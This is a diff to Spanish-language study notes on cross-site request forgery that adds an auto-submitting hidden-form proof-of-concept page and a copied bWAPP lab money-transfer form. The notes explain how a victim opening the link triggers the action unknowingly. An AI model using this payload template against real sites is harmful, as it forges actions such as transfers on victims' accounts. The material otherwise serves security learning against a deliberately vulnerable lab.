@@ -33,7 +33,42 @@ Este tipo de scripts se deben de hacer en html, en donde sabemos que podemos hac
 ```
 Desde la parte de action es para agregar un amigo en el lab de la pagina anterior. Por lo que al momento de mandarlo a alguien y este abra el correo o url, automáticamente se le agregara el amigo con ese identificador que en este caso es 57.  La acción va de la mano con el identificador del usuario a atacar.
 
-```html
 
+```html
+<html>
+  <body>
+    <form action="http://dominio/recurso" method="GET/POST">
+      <input type="hidden" name="appsec" value="appsec" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+
+```html 
+<div id="main">
+    
+    <h1>CSRF (Transfer Amount)</h1>
+
+    <p>Amount on your account: <b> 1000 EUR</b></p>
+
+    <form action="[http://bwapp.xyz/csrf_2.php](view-source:http://bwapp.xyz/csrf_2.php)" method="GET">
+
+        <p><label for="account">Account to transfer:</label><br />
+        <input type="text" id="account" name="account" value="223-45678-90"></p>
+
+        <p><label for="amount">Amount to transfer:</label><br />
+        <input type="text" id="amount" name="amount" value="100"></p>
+
+        <button type="submit" name="action" value="transfer">Transfer</button>   
+
+    </form>
+    
+</div>
 ```
 
